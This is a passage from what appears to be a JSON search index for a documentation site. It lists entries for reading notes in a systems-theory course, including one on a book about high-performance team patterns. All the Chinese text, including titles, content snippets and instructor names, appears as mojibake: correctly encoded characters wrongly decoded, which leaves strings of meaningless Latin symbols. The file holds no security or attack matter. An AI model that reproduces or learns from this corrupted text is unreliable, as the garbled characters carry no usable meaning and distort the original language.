‚ç¬”è®°ã€‚\n æˆè¯¾è€å¸ˆï¼šå¼ å»ºå¿ ã€å¾æ•¬ä¸œ\n "},{"id":528,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E9%AB%98%E6%95%88%E8%83%BD%E5%9B%A2%E9%98%9F%E6%A8%A1%E5%BC%8F/","title":"é«˜æ•ˆèƒ½å›¢é˜Ÿæ¨¡å¼","section":"ç³»ç»Ÿç†è®ºè¯¾ç¨‹","content":" ã€Šé«˜æ•ˆèƒ½å›¢é˜Ÿæ¨¡å¼ã€‹è¯»ä¹¦ç¬”è®°\n README #  "}]